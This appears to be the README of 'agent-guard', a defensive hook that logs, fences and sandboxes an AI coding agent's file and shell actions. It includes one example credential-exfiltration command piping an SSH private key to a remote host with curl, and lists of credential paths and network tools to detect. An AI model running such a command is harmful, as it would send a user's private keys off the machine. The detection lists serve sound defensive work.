# agent-guard

**See what your AI coding agent touches, and fence it in.**

`agent-guard` is a [Claude Code](https://claude.com/claude-code) hook that runs
before every tool call. It does two things:

1. **Logs** every read, write, edit, shell command, and web fetch to a local
   audit trail, viewable on a **live dashboard**.
2. **Blocks** any file access outside the folders you allow, so a stray agent
   can't wander into `~/.ssh`, your browser profile, or the rest of your disk.
3. **Inspects** Bash commands for risky operations the path fence can't see:
   credential reads, network egress, destructive ops, and (blocked by default)
   the clearest credential-exfiltration case.

For a real OS-level fence around a single command, there's also
[`agentguard run`](#sandboxed-run-agentguard-run).

Pure Python standard library. No dependencies, no telemetry, nothing leaves your
machine.

```bash
pip install sneakoscope   # the CLI is `agentguard` (alias: `sneakoscope`)
agentguard install      # adds the PreToolUse hook to ~/.claude/settings.json
agentguard dashboard    # http://127.0.0.1:8799
```

Open a new Claude Code session and watch it work in real time.

---

## Why

Agentic coding tools can read and write anything the process can. Most of the
time that's fine; occasionally it isn't, and either way you can't *see* it. Cloud
sandboxes solve this by locking the agent in a box, but you lose your local
setup. `agent-guard` is the lightweight local version: a boundary you define, a
log you can audit, and a red banner the moment something steps over the line.

## How it works

Claude Code fires a `PreToolUse` hook before running any tool and passes it the
tool name and arguments as JSON on stdin. agent-guard:

- appends the call to a JSONL audit log (for the dashboard),
- for file tools (`Read`, `Write`, `Edit`, `MultiEdit`, `NotebookEdit`, `Grep`,
  `Glob`), resolves the target path and checks it against your allowed roots, and
- for `Bash`, inspects the command string (see below).

Exit code `2` blocks the tool and the reason is shown back to the agent; exit `0`
allows it. **It fails open**: any internal error allows the call, so a bug in the
guard can never brick your agent.

## Bash inspection

Path checks only cover the file tools; a shell command can read a secret or pipe
it off the box without naming a path the guard sees. agent-guard parses each
`Bash` command and records findings, biased hard toward **very low false
positives** so it never trips over normal dev work:

- **credential reads** — `~/.ssh`, `~/.aws`, `.env` / `*.env`, `*.pem`, `*.key`,
  `.netrc`, browser `Login Data`, and similar
- **network egress** — `curl` / `wget` / `nc` / `scp` / `rsync` … to a remote host
- **destructive ops** — `rm -rf` / `dd` / `mkfs` on an absolute path outside your roots
- **outside-root access** — `cat` / `cp` / `mv` / `tee` (or a redirect) of an
  absolute path outside your roots

By default these are **flagged** (logged as suspicious, shown on the dashboard)
but still allowed. Only the clearest case is **blocked**: a command that reads
credential material *and* sends it to a remote host in the same line (e.g.
`cat ~/.ssh/id_rsa | curl -X POST https://host -d @-`). A plain `git`, `npm`, or
`python` command is never flagged.

Two config keys control it (both default `true`):

- **`inspect_bash`** — inspect Bash commands at all.
- **`bash_enforce`** — let a credential-exfil finding actually block (exit 2).
  Set `false` to flag everything and block nothing.

Config is re-read on every call, so edits take effect immediately, no restart.

## Configuration

`agentguard install` writes `~/.agentguard/config.json`:

```json
{
  "enforce": true,
  "allowed_roots": [
    "C:\\Users\\you\\Downloads",
    "C:\\Users\\you\\.claude"
  ],
  "log_path": "C:\\Users\\you\\.agentguard\\access-log.jsonl",
  "inspect_bash": true,
  "bash_enforce": true
}
```

- **`allowed_roots`** — folders the agent may read/write. Everything else is
  outside. Add your project directories here.
- **`enforce`** — `true` blocks; set `false` to **log-only** (watch first, fence
  later).
- **`log_path`** — where the audit trail is written.
- **`inspect_bash`** / **`bash_enforce`** — Bash inspection, see
  [above](#bash-inspection).

Point somewhere else with `AGENTGUARD_CONFIG=/path/to/config.json`.

## The dashboard

```bash
agentguard dashboard          # default port 8799
agentguard dashboard --port 9000
```

Auto-refreshing local page: tiles (reads / writes / shell / web / outside /
blocked), a filterable activity table (all / outside / blocked), an
activity-over-time timeline, and the top folders being touched. A red banner
appears the instant anything is blocked.

## Sandboxed run (`agentguard run`)

The hook is *advisory*: it sees a tool call and can refuse it, but nothing stops
a subprocess from touching the disk directly. `run` launches a single command
inside a real OS filesystem sandbox that confines reads and writes to your
`allowed_roots`:

```bash
agentguard run -- python train.py      # or: sneakoscope run -- ...
```

Support is per-OS, and honest about it:

| OS | Backend | Notes |
| --- | --- | --- |
| Linux | `bwrap` (bubblewrap), else `firejail` | Roots are bind-mounted read-write; the rest of `$HOME` is not visible. |
| macOS | `sandbox-exec` | A generated seatbelt profile: deny by default, read+write only inside the roots. |
| Windows | — | **No OS-level sandbox.** There is no clean native equivalent, so `run` refuses rather than pretend. Use Docker or WSL2 for a real fence; the hook still gives you advisory protection. |

If no sandbox tool is found on Linux or macOS, `run` prints how to install one
and refuses to run the command unsandboxed.

## Commands

| Command | What it does |
| --- | --- |
| `agentguard install` | Add the PreToolUse hook to `~/.claude/settings.json` (merges, keeps your other hooks). |
| `agentguard uninstall` | Remove it again. |
| `agentguard run -- <cmd>` | Run a command inside an OS filesystem sandbox (Linux/macOS; see above). |
| `agentguard dashboard` | Serve the live dashboard. |
| `agentguard status` | Print config, whether the hook is installed, and recent counts. |
| `agentguard harden` | Show credential read-deny rules to add to Claude Code's own permissions (dry-run; `--apply` to write). |
| `agentguard hook` | The guard itself — what Claude Code invokes. You won't run this by hand. |

### `harden`

The folder fence stops access *outside* your roots. `harden` adds a second layer
using Claude Code's native `permissions.deny`: it keeps tools away from
credential files (`.ssh`, `.aws`, `.env`, `*.pem`, browser login data, …)
wherever they live. It's a dry-run by default:

```bash
agentguard harden          # print what it would add
agentguard harden --apply  # write the rules to settings.json
```

## Manual install (without pip)

The repo works as-is. Clone it and point a `PreToolUse` hook at the shim:

```json
{
  "hooks": {
    "PreToolUse": [
      { "hooks": [{ "type": "command", "command": "python",
                    "args": ["/path/to/agent-guard/guard.py"], "timeout": 10 }] }
    ]
  }
}
```

Then `python dashboard.py` for the dashboard.

## License

MIT.
